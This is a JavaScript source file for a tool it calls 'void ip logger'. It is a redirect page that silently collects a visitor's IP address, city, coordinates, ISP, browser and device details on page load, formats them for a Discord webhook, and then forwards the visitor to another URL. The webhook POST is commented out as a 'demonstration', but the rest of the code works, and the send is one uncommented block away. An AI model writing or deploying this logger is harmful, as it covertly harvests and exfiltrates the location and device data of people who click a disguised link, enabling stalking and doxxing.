
// Tracking script for void IP logger
document.addEventListener('DOMContentLoaded', function() {
    // Configuration - these values will be replaced when the repository is created
    const CONFIG = {
        destinationUrl: "{{DESTINATION_URL}}",
        discordWebhook: "{{DISCORD_WEBHOOK}}",
        trackingId: "{{TRACKING_ID}}"
    };

    // Log visitor information
    async function logVisitorInfo() {
        try {
            // Get visitor's IP and info
            const response = await fetch('https://ipinfo.io/json');
            const data = await response.json();
            
            // Prepare visitor data
            const visitorData = {
                ip: data.ip || 'unknown',
                location: {
                    city: data.city || 'unknown',
                    region: data.region || 'unknown',
                    country: data.country || 'unknown',
                    coordinates: data.loc || 'unknown',
                    timezone: data.timezone || 'unknown',
                    postal: data.postal || 'unknown'
                },
                device: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    vendor: navigator.vendor || 'unknown'
                },
                network: {
                    isp: data.org || 'unknown',
                    hostname: data.hostname || 'unknown',
                    asn: data.asn || 'unknown'
                },
                visit: {
                    time: new Date().toISOString(),
                    referrer: document.referrer || 'direct',
                    trackingId: CONFIG.trackingId
                }
            };
            
            // Send to Discord webhook if available
            if (CONFIG.discordWebhook) {
                sendToDiscord(CONFIG.discordWebhook, visitorData);
            }
            
            // In a real implementation, we would also log this data to a database or analytics service
            console.log('Visitor data:', visitorData);
            
            // Redirect after a short delay
            setTimeout(() => {
                window.location.href = CONFIG.destinationUrl;
            }, 1500);
            
        } catch (error) {
            console.error('Error logging visitor info:', error);
            
            // Redirect anyway if there's an error
            setTimeout(() => {
                window.location.href = CONFIG.destinationUrl;
            }, 1000);
        }
    }
    
    // Function to send visitor info to Discord webhook
    async function sendToDiscord(webhookUrl, visitorData) {
        try {
            // Create Discord embed payload
            const payload = {
                embeds: [{
                    title: 'new visitor detected',
                    color: 0x0066ff,
                    fields: [
                        {
                            name: 'ip address',
                            value: visitorData.ip,
                            inline: true
                        },
                        {
                            name: 'location',
                            value: `${visitorData.location.city}, ${visitorData.location.country}`,
                            inline: true
                        },
                        {
                            name: 'coordinates',
                            value: visitorData.location.coordinates,
                            inline: true
                        },
                        {
                            name: 'device',
                            value: getDeviceInfo(visitorData.device.userAgent),
                            inline: false
                        },
                        {
                            name: 'isp',
                            value: visitorData.network.isp,
                            inline: false
                        },
                        {
                            name: 'referrer',
                            value: visitorData.visit.referrer,
                            inline: false
                        },
                        {
                            name: 'time',
                            value: visitorData.visit.time,
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'void ip logger'
                    }
                }]
            };
            
            // In a real implementation, this would send the payload to the Discord webhook
            // For security reasons, this should be handled server-side
            // This is a simplified version for demonstration purposes
            
            console.log('Sending to Discord webhook:', payload);
            
            // Simulate sending to Discord
            // In a real implementation, we would use fetch() to send the payload
            // fetch(webhookUrl, {
            //     method: 'POST',
            //     headers: {
            //         'Content-Type': 'application/json',
            //     },
            //     body: JSON.stringify(payload),
            // });
            
        } catch (error) {
            console.error('Error sending to Discord:', error);
        }
    }
    
    // Helper function to get device info from user agent
    function getDeviceInfo(userAgent) {
        let deviceInfo = 'unknown device';
        
        if (userAgent.includes('Windows')) {
            deviceInfo = 'windows';
        } else if (userAgent.includes('Mac')) {
            deviceInfo = 'macos';
        } else if (userAgent.includes('Android')) {
            deviceInfo = 'android';
        } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
            deviceInfo = 'ios';
        } else if (userAgent.includes('Linux')) {
            deviceInfo = 'linux';
        }
        
        if (userAgent.includes('Chrome')) {
            deviceInfo += ', chrome';
        } else if (userAgent.includes('Firefox')) {
            deviceInfo += ', firefox';
        } else if (userAgent.includes('Safari')) {
            deviceInfo += ', safari';
        } else if (userAgent.includes('Edge')) {
            deviceInfo += ', edge';
        }
        
        return deviceInfo;
    }
    
    // Start logging visitor information
    logVisitorInfo();
});
